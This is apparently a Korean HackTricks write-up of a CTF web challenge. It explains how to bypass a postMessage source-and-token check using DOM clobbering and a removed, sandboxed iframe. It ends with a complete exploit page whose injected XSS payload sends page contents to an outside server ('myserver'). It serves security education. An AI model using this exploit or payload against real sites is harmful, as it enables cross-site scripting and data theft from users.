# SOP 우회하기 - Iframes - 2

{{#include ../../banners/hacktricks-training.md}}

## SOP-2의 Iframes

이 [**해결책**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution)에서 [**도전 과제**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic_)는 이전 섹션과 유사한 방법을 제안합니다. 확인해 봅시다.

이 도전 과제에서 공격자는 **우회해야** 합니다:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
그가 그렇게 한다면, 그는 **postmessage**를 사용하여 **`innerHTML`**로 페이지에 작성될 HTML 콘텐츠를 보낼 수 있으며, 이는 위생 처리 없이 (**XSS**) 이루어집니다.

**첫 번째 체크**를 우회하는 방법은 **`window.calc.contentWindow`**를 **`undefined`**로 만들고 **`e.source`**를 **`null`**로 만드는 것입니다:

- **`window.calc.contentWindow`**는 실제로 **`document.getElementById("calc")`**입니다. **`document.getElementById`**를 **`<img name=getElementById />`**로 덮어쓸 수 있습니다 (Sanitizer API -[여기](https://wicg.github.io/sanitizer-api/#dom-clobbering)-는 기본 상태에서 DOM 클로버링 공격으로부터 보호하도록 구성되어 있지 않습니다).
- 따라서, **`document.getElementById("calc")`**를 **`<img name=getElementById /><div id=calc></div>`**로 덮어쓸 수 있습니다. 그러면 **`window.calc`**는 **`undefined`**가 됩니다.
- 이제 **`e.source`**가 **`undefined`** 또는 **`null`**이 되어야 합니다 (왜냐하면 `==`가 사용되기 때문에 **`null == undefined`**는 **`True`**입니다). 이를 얻는 것은 "쉬운" 일입니다. **iframe**을 생성하고 그로부터 **postMessage**를 보내고 즉시 **iframe**을 **제거**하면, **`e.origin`**은 **`null`**이 될 것입니다. 다음 코드를 확인하세요.
```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) //e.origin === null
```
**두 번째 체크**를 우회하기 위해 **`token`** 값을 `null`로 설정하고 **`window.token`** 값을 **`undefined`**로 만드는 방법은 다음과 같습니다:

- 값이 `null`인 `token`을 postMessage로 보내는 것은 사소한 일입니다.
- **`window.token`**은 **`document.cookie`**를 사용하는 **`getCookie`** 함수 호출에서 사용됩니다. **`null`** 출처 페이지에서 **`document.cookie`**에 접근하면 **error**가 발생한다는 점에 유의하세요. 이로 인해 **`window.token`**은 **`undefined`** 값을 가지게 됩니다.

최종 솔루션은 [**@terjanq**](https://twitter.com/terjanq)에 의해 [**다음과 같습니다**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html):
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open(
'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
)

function start() {
var ifr = document.createElement("iframe")
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = "allow-scripts allow-popups"
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr)

function hack() {
var win = open("https://obligatory-calc.ctf.sekai.team")
setTimeout(() => {
parent.postMessage("remove", "*")
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage(
{
token: null,
result:
"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
},
"*"
)
}, 1000)
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = (e) => {
if (e.data == "remove") document.body.innerHTML = ""
}
}
setTimeout(start, 1000)
</script>
</body>
</html>
```
{{#include ../../banners/hacktricks-training.md}}
